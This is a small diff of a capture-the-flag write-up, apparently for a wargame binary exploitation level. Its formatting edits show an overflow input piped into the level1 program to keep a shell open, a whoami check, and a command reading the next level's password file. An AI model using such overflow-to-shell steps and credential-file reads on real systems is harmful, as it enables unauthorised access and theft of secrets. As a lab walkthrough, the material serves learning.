@@ -45,7 +45,7 @@ python -c 'print "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnoooopp
 
 and
 
-```
+```Shell
 cat /tmp/test - | ./level1
 Good... Wait what?
 whoami
@@ -55,4 +55,6 @@ level2
 (cat -) keep the stdin open
 
 Since the level1 file belongs to level2 we can now:
+```Shell
 cat /home/user/level2/.pass
+```
